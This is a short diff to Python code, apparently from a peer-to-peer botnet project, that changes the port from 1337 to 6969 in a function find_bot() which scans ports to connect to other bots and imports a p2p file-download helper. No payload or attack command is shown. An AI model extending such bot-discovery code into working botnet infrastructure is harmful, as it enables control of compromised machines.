@@ -6,11 +6,11 @@ from lib.files import p2p_download_file
 
 # Keep track of where our server is
 # This is primarily so we don't try to talk to ourselves
-server_port = 1337
+server_port = 6969
 
 def find_bot():
     print("Finding another bot...")
-    port = 1337
+    port = 6969
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while 1:
         if port == server_port:
